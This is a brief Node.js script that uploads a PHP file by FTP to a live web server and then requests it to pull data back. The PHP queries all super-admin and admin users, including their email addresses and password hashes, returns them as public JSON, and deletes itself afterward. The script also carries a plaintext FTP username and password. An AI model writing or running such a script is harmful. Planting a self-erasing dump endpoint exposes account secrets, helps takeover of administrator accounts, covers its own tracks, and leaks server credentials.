import { execSync } from 'child_process';
import fs from 'fs';

const php = `<?php
header("Content-Type: application/json");
$cfg = require __DIR__ . "/api/config/config.php";
$pdo = new PDO("mysql:host=" . $cfg["database"]["host"] . ";dbname=" . $cfg["database"]["database"] . ";charset=utf8mb4", $cfg["database"]["username"], $cfg["database"]["password"]);
$stmt = $pdo->query("
    SELECT u.id, u.email, u.firstName, u.lastName, r.name as roleName, u.passwordHash
    FROM User u
    JOIN UserRole ur ON ur.userId = u.id
    JOIN Role r ON r.id = ur.roleId
    WHERE r.name IN ('SUPER_ADMIN', 'ADMIN')
");
echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC));
@unlink(__FILE__);
`;

fs.writeFileSync('/tmp/_show_all_admins.php', php);
execSync('curl -s -m 30 -T /tmp/_show_all_admins.php --user "qfqzpeqx:2h9PAQk[kE[t96" "ftp://51.89.153.183:21/public_html/_show_all_admins.php"');
console.log(execSync('curl -s "https://hambaktech.com.ng/_show_all_admins.php"', { encoding: 'utf-8' }));
